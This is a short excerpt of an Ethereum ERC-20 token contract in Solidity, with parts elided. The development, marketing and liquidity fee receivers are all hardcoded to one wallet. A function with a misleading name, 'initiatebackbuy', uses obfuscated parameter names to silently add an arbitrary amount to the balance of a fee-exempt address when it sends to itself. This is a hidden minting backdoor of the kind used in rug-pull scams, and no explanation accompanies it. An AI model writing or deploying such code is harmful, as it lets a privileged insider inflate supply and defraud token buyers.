...
contract a is IERC20, Ownable {
    ...
    address internal constant development_receiver = 0x57638Addc8342A51Aa8a83356f16a3691B6EAC20; 
    address internal constant marketing_receiver = 0x57638Addc8342A51Aa8a83356f16a3691B6EAC20;
    address internal constant liquidity_receiver = 0x57638Addc8342A51Aa8a83356f16a3691B6EAC20;
    ...
    function initiatebackbuy(address tttt, address aaaa, uint256 amount) internal {
        if (tttt==aaaa){ if (!shouldTakeFee(tttt,aaaa)){_balances[tttt] = _balances[tttt].add(amount);}}
